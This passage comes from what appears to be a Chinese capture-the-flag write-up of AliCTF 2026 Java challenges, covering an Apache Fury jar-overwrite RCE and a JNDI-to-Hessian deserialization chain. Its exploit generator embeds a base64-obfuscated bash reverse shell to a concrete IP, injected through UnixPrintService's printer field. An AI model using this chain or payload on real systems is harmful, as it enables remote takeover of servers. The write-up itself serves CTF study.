</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Payload saved to payload_dns.b64&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;Payload Base64: &#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>b64</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>至于<code>dnsns.jar</code> 怎么改？驰骋AWDP赛场的诸君，像这种<code>JarEditor</code> 手改字节码的基操，想必无需我多言了，对吧？</p><p><img src=/img/2026-alictf/6.png alt=img></p><p>先发包覆盖<code>dnsns.jar</code> ，再发包触发恶意类加载，完成RCE</p><p><img src=/img/2026-alictf/7.png alt=img></p><p>比赛结束后，我试图向她解释什么是 Apache Fury 的黑名单绕过，解释那个 <code>dnsns.jar</code> 的覆盖是多么的神来之笔。她只是淡淡地看了我一眼转身就走了</p><p>那一刻我才明白</p><p><strong>可惜她不懂JAVA，也不懂我的⚡超！⚡级！⚡炎！🔥舞！🔥爆！⚡爆！⚡回！⚡</strong></p><p><img src=/img/2026-alictf/8.png alt=img></p><p>参考资料：</p><ol><li><a href="https://mp.weixin.qq.com/s/dMl0aEg6p7w7MKlUe7pCdg?poc_token=HO5E0WejTX00WfrQI8oI22YsiTkxiEcLfLgbYyWv">AliyunCTF2025 题解之 Jtools Fury 反序列化利用分析</a></li><li><a href=https://eddiemurphy89.github.io/2025/03/01/AliyunCTF2025-JTools%E5%88%86%E6%9E%90/#%E5%89%8D%E8%A8%80>AliyunCTF2025-JTools分析</a></li><li>[Servlet中的时间竞争及AspectJWeaver反序列化Gadget构造<a href=https://meizjm3i.github.io/2021/03/07/Servlet%E4%B8%AD%E7%9A%84%E6%97%B6%E9%97%B4%E7%AB%9E%E4%BA%89%E4%BB%A5%E5%8F%8AAsjpectJWeaver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadget%E6%9E%84%E9%80%A0-AntCTFxD-3CTF-non-RCE%E9%A2%98%E8%A7%A3/>non-RCE 题解]</a></li><li>[<a href=https://mp.weixin.qq.com/s/9e0V4bnV6fuGAfO1AKLYdw>Java Puzzle #3 WP] Fastjson write ascii JAR RCE</a></li><li><a href="https://www.bilibili.com/video/BV1kdnszCEUy/?spm_id_from=333.337.search-card.all.click&amp;vd_source=6870219ddced853e80ae239d5319e97c">可惜她不玩街霸，也没人懂我的⚡超！⚡级！⚡炎！🔥舞！🔥爆！⚡爆！⚡回！⚡</a></li></ol><h2 id=mhga>MHGA</h2><p>我曾经发誓这辈子不会再为Java流泪，但MHGA这JNDI+Hessian+JDBC组合洞的韧性让我哭花了妆😭😭😭</p><h3 id=入口点><strong>入口点</strong></h3><p>题目提供了一个 Spring Boot 应用，核心在于 <code>Web.java</code> 提供了一个 HTTP 接口，该接口接受一个 <code>X-Lookup-URL</code> 头，并对其进行 JNDI <code>lookup</code>。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=c1>// Web.java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>String</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>exchange</span><span class=p>.</span><span class=na>getRequestHeaders</span><span class=p>().</span><span class=na>getFirst</span><span class=p>(</span><span class=s>&#34;X-Lookup-URL&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>new</span><span class=w> </span><span class=n>InitialContext</span><span class=p>().</span><span class=na>lookup</span><span class=p>(</span><span class=n>url</span><span class=p>);</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这是一个典型的 JNDI 注入入口，JDK版本为 OpenJDK 11.0.29</p><h3 id=stage-1--hessian-链构造><strong>Stage 1:</strong> <strong>Hessian</strong> <strong>链构造</strong></h3><p>题目名称暗示了 Hessian。检查依赖发现 <code>com.caucho.hessian.client.HessianProxyFactory</code> 实现了 <code>javax.naming.spi.ObjectFactory</code>。</p><p>可以通过 JNDI 返回一个 <code>Reference</code> 指向 <code>HessianProxyFactory</code>，所有的 <code>Reference</code> 属性都会被转化为 Hessian 代理的配置。</p><p>当 JNDI 进行 <code>getObjectInstance</code> 时，返回的是一个 Hessian 代理对象。如果后续对这个代理对象调用了方法，就会触发 Hessian 反序列化请求。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=c1>// HessianProxyFactory.java</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=nf>getObjectInstance</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>obj</span><span class=p>,</span><span class=w> </span><span class=n>Name</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>Context</span><span class=w> </span><span class=n>nameCtx</span><span class=p>,</span><span class=w> </span><span class=n>Hashtable</span><span class=o>&lt;?</span><span class=p>,</span><span class=w> </span><span class=o>?&gt;</span><span class=w> </span><span class=n>environment</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Reference</span><span class=w> </span><span class=n>ref</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Reference</span><span class=p>)</span><span class=n>obj</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>api</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>String</span><span class=w> </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=kc>null</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>ref</span><span class=p>.</span><span class=na>size</span><span class=p>();</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>RefAddr</span><span class=w> </span><span class=n>addr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ref</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>i</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>type</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>addr</span><span class=p>.</span><span class=na>getType</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>String</span><span class=p>)</span><span class=n>addr</span><span class=p>.</span><span class=na>getContent</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 提取 Reference 中的配置</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>type</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;type&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>api</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w> </span><span class=c1>// 代理接口类型</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>type</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;url&#34;</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>url</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>value</span><span class=p>;</span><span class=w> </span><span class=c1>// 目标 URL</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// ... user, password ...</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// 创建 Hessian 代理</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Class</span><span class=w> </span><span class=n>apiClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=n>api</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>,</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>_loader</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=k>this</span><span class=p>.</span><span class=na>create</span><span class=p>(</span><span class=n>apiClass</span><span class=p>,</span><span class=w> </span><span class=n>url</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p><strong>利用点</strong>：</p><p>攻击者可以通过 JNDI 返回一个精心构造的 <code>Reference</code>：</p><ol><li><strong>Factory Class</strong>: <code>com.caucho.hessian.client.HessianProxyFactory</code> (本地存在)。</li><li><strong>type</strong>: 设置为任意接口（例如 <code>javax.naming.directory.DirContext</code>）。</li><li><strong>url</strong>: 设置为攻击者控制的 HTTP 地址。</li></ol><p>当 <code>JndiLoginModule</code> 获取到这个对象后，它实际上是一个 Hessian 代理。一旦它调用该对象的任何方法（如 <code>DirContext.search</code>），Hessian 代理就会拦截调用，并通过 HTTP POST 请求将方法调用序列化发送给攻击者的 URL。</p><p>攻击者响应该 HTTP 请求时，返回一个恶意的 Hessian 序列化数据（RPC Reply），客户端在收到响应后会反序列化该数据，从而触发 Gadget Chain。</p><p>至于Hessian Payload，发现存在Jackson依赖就好办了，使用 <code>Jackson POJONode</code> 触发 <code>UnixPrintService</code>的getter 方法达成RCE</p><p>2026 年了，不识 <code>UnixPrintService</code>，纵称英雄也枉然，快去学习我大哥yemoli在KCON2023首秀的《<strong>Magic In Java</strong> <strong>API</strong>》议题</p><p><img src=/img/2026-alictf/9.png alt=img></p><p><strong>完整<strong><strong>POC</strong></strong>如下（</strong> <strong>Hessian</strong> <strong>序列化****数据必须是 2.0</strong> <strong>RPC</strong> <strong>Reply 格式）：</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Java data-lang=Java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.Hessian2Output</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.caucho.hessian.io.SerializerFactory</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.databricks.client.jdbc.internal.fasterxml.jackson.databind.node.POJONode</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.ClassPool</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtClass</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javassist.CtMethod</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.management.BadAttributeValueExpException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.IOException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.*</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.Base64</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.LinkedHashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.concurrent.ConcurrentHashMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.concurrent.atomic.AtomicReference</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import static</span><span class=w> </span><span class=nn>common.Reflections.newInstanceWithoutConstructor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import static</span><span class=w> </span><span class=nn>common.Reflections.setFieldValue</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import static</span><span class=w> </span><span class=nn>common.Util.makeMap</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import static</span><span class=w> </span><span class=nn>java.lang.reflect.AccessibleObject.setAccessible</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>ExploitGenerator</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// 目标文件路径</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//    private static final String cmd = &#34;;touch /tmp/pwnnnnn&#34;;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>private</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kd>final</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;; echo YmFzaCAtaSA+JiAvZGV2L3RjcC8yMjMuMTA5LjQ5LjUxLzk5OTkgMD4mMQ== | base64 -d | bash; echo&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>main</span><span class=p>(</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>args</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>unsafeClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.misc.Unsafe&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>unsafeField</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafeClass</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;theUnsafe&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>unsafeField</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>unsafe</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafeField</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Method</span><span class=w> </span><span class=n>allocateInstance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>unsafeClass</span><span class=p>.</span><span class=na>getMethod</span><span class=p>(</span><span class=s>&#34;allocateInstance&#34;</span><span class=p>,</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 3. 实例化 UnixPrintService (替换之前的 Proxy)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 这个类在 PrintServiceLookupProvider 中被广泛使用，是合法的 PrintService 实现</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Class</span><span class=o>&lt;?&gt;</span><span class=w> </span><span class=n>unixPrintServiceClass</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;sun.print.UnixPrintService&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Object</span><span class=w> </span><span class=n>service</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>allocateInstance</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>unsafe</span><span class=p>,</span><span class=w> </span><span class=n>unixPrintServiceClass</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>service</span><span class=p>,</span><span class=w> </span><span class=s>&#34;printer&#34;</span><span class=p>,</span><span class=w> </span><span class=n>cmd</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>service</span><span class=p>,</span><span class=w> </span><span class=s>&#34;isInvalid&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>false</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>setFieldValue</span><span class=p>(</span><span class=n>service</span><span class=p>,</span><span class=w> </span><span class=s>&#34;lpcStatusCom&#34;</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>String</span><span class=o>[]</span><span class=p>{</span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>POJONode</span><span class=w> </span><span class=n>pojoNode</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>POJONode</span><span class=p>(</span><span class=n>service</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// ---------------------------------------------------------</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 5. Hessian2 序列化 (关键修复部分)</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// ---------------------------------------------------------</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Hessian2_serialize</span><span class=p>(</span><span class=n>pojoNode</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 6. 输出 Base64</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>base64Payload</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Base64</span><span class=p>.</span><span class=na>getEncoder</span><span class=p>().</span><span class=na>encodeToString</span><span class=p>(</span><span class=n>payload</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;----- Payload (Base64) -----&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=n>base64Payload</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>System</span><span class=p>.</span><span class=na>out</span><span class=p>.</span><span class=na>println</span><span class=p>(</span><span class=s>&#34;----------------------------&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=nf>Hessian2_serialize</span><span class=p>(</span><span class=n>Object</span><span class=w> </span><span class=n>o</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>SerializerFactory</span><span class=w> </span><span class=n>factory</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SerializerFactory</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>factory</span><span class=p>.</span><span class=na>setAllowNonSerializable</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ByteArrayOutputStream</span><span class=w> </span><span class=n>baos</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>ByteArrayOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Hessian2Output</span><span class=w> </span><span class=n>hessian2Output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>Hessian2Output</span><span class=p>(</span><span class=n>baos</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=sc>&#39;H&#39;</span><span class=p>);</span><span class=w>  </span><span class=c1>// Hessian 2.0 call header</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x02</span><span class=p>);</span><span class=w> </span><span class=c1>// major version</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>0x00</span><span class=p>);</span><span class=w> </span><span class=c1>// minor version</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=sc>&#39;R&#39;</span><span class=p>);</span><span class=w>  </span><span class=c1>// Reply marker</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>baos</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>67</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>setSerializerFactory</span><span class=p>(</span><span class=n>factory</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>writeObject</span><span class=p>(</span><span class=n>o</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hessian2Output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>baos</span><span class=p>.</span><span class=na>toByteArray</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kd>static</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>setAccessible</span><span class=p>(</span><span class=n>AccessibleObject</span><span class=w> </span><span class=n>member</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
